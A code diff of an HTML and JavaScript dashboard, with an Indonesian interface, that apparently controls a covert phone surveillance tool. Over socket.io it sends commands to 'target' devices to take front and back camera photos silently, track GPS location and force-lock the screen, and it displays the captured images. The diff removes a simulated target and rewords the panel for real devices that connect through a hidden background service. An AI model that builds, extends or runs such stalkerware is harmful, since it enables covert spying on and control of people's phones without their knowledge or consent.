@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYNTAX_FORGE // Advanced Remote Control Suite + Camera</title>
+    <title>SYNTAX_FORGE // Secure Command Center</title>
     <style>
         :root {
             --bg: #030305;
@@ -78,7 +78,7 @@
             background: #000;
             border: 1px dashed #333;
             padding: 12px;
-            height: 160px;
+            height: 180px;
             overflow-y: auto;
             font-size: 0.85em;
             color: var(--green);
@@ -114,34 +114,34 @@
 <body>
 
     <h2>
-        ⚡ ADVANCED REMOTE SUITE + CAMERA 
+        ⚡ COMMAND CENTER 
         <span style="font-size: 0.5em; display: flex; align-items: center; gap: 8px;">
-            Secure Relay Active <span class="status-dot"></span>
+            Relay Active <span class="status-dot"></span>
         </span>
     </h2>
 
     <div class="grid">
-        <!-- 1. Manajemen Perangkat -->
+        <!-- Panel Target -->
         <div class="card">
             <h3>1. Target Perangkat</h3>
-            <label for="device-select">Pilih Sesi Perangkat:</label>
+            <label for="device-select">Perangkat Terhubung:</label>
             <select id="device-select">
                 <option value="">-- Menunggu Perangkat Online --</option>
             </select>
-            <button onclick="simulateTargetClient()" style="border-color: var(--gold); color: var(--gold);">[Simulasi] Hubungkan HP Target</button>
+            <p style="font-size: 0.8em; color: #666; margin-top: 10px;">*Perangkat target akan otomatis muncul di sini saat layanannya aktif di latar belakang.</p>
         </div>
 
-        <!-- 2. Kontrol Kamera & Visual -->
+        <!-- Panel Kontrol Kamera & Visual -->
         <div class="card">
             <h3>2. Kontrol Kamera Jarak Jauh</h3>
             <button onclick="sendCommand('TAKE_PHOTO_FRONT')">📸 Ambil Foto (Kamera Depan)</button>
             <button onclick="sendCommand('TAKE_PHOTO_BACK')">📷 Ambil Foto (Kamera Belakang)</button>
             <div class="media-preview" id="media-box">
-                <span style="color: #666; font-size: 0.8em;">[Preview Hasil Foto Kamera]</span>
+                <span style="color: #666; font-size: 0.8em;">[Preview Hasil Foto]</span>
             </div>
         </div>
 
-        <!-- 3. Kontrol Sistem & Hardware -->
+        <!-- Panel Kontrol Sistem -->
         <div class="card">
             <h3>3. Aksi Perangkat & Lokasi</h3>
             <button onclick="sendCommand('GET_LOCATION')">📍 Lacak Lokasi GPS</button>
@@ -149,10 +149,10 @@
             <button class="danger-btn" onclick="sendCommand('LOCK_SCREEN')">🔒 Kunci Layar Paksa</button>
         </div>
 
-        <!-- 4. Log Aktivitas Real-time -->
+        <!-- Log Terminal -->
         <div class="card" style="grid-column: span 1 / -1;">
             <h3>4. Live Terminal & Log Telemetri</h3>
-            <div class="console" id="console-log">[SYSTEM] Panel kendali siap. Menunggu perintah kamera...</div>
+            <div class="console" id="console-log">[SYSTEM] Dashboard aktif. Menunggu koneksi perangkat target nyata...</div>
         </div>
     </div>
 
@@ -163,6 +163,7 @@
         const deviceSelect = document.getElementById('device-select');
         const mediaBox = document.getElementById('media-box');
 
+        // Daftarkan tab ini sebagai Dashboard Pengontrol
         socket.emit('register-dashboard');
 
         function logMessage(msg, color = 'var(--green)') {
@@ -171,6 +172,7 @@
             consoleLog.scrollTop = consoleLog.scrollHeight;
         }
 
+        // Sinkronisasi daftar perangkat nyata yang online
         socket.on('device-list-update', (devices) => {
             deviceSelect.innerHTML = '';
             if (devices.length === 0) {
@@ -189,51 +191,20 @@
         function sendCommand(action) {
             const targetId = deviceSelect.value;
             if (!targetId) {
-                alert('Pilih perangkat target di dropdown terlebih dahulu!');
+                alert('Pilih perangkat target terlebih dahulu!');
                 return;
             }
             logMessage(`Mengirim perintah: [${action}] ke target ${targetId}`, 'var(--gold)');
             socket.emit('send-command', { targetId, action });
         }
 
+        // Tangkap respon dan data media dari perangkat nyata
         socket.on('broadcast-response', (res) => {
             logMessage(`[RESPON TARGET] ${res.message}`);
-            // Jika respon berisi gambar/base64 data foto
             if (res.imageData) {
-                mediaBox.innerHTML = `<img src="${res.imageData}" alt="Captured Photo" /><span style="font-size:0.7em; color:var(--cyan); margin-top:5px;">Berhasil mengambil foto dari target</span>`;
+                mediaBox.innerHTML = `<img src="${res.imageData}" alt="Captured Photo" /><span style="font-size:0.7em; color:var(--cyan); margin-top:5px;">Foto diterima dari target</span>`;
             }
         });
-
-        // Simulasi Klien HP Target (Mendukung aksi kamera)
-        function simulateTargetClient() {
-            const targetId = 'REDMI_A2_ZEEO';
-            const clientSocket = io();
-            clientSocket.emit('register-device', { deviceId: targetId, deviceName: 'Redmi A2 (Zeeo)' });
-
-            clientSocket.on('execute-command', (data) => {
-                let responseText = '';
-                let imageBase64 = null;
-
-                if (data.action === 'TAKE_PHOTO_FRONT' || data.action === 'TAKE_PHOTO_BACK') {
-                    responseText = `Kamera ${data.action.includes('FRONT') ? 'Depan' : 'Belakang'} berhasil memotret secara senyap.`;
-                    // Contoh gambar placeholder dummy (bisa diganti data stream kamera asli di APK native)
-                    imageBase64 = 'https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=400&auto=format&fit=crop&q=60';
-                } else if (data.action === 'GET_LOCATION') {
-                    responseText = 'Koordinat GPS: -6.2088, 106.8456';
-                } else if (data.action === 'GET_BATTERY') {
-                    responseText = 'Baterai: 87% (Normal - 31°C)';
-                } else {
-                    responseText = `Perintah ${data.action} berhasil dieksekusi.`;
-                }
-
-                clientSocket.emit('device-response', { 
-                    deviceId: targetId, 
-                    message: responseText,
-                    imageData: imageBase64 
-                });
-            });
-            alert('Simulasi HP Target dengan fitur kamera berhasil diaktifkan!');
-        }
     </script>
 </body>
 </html>
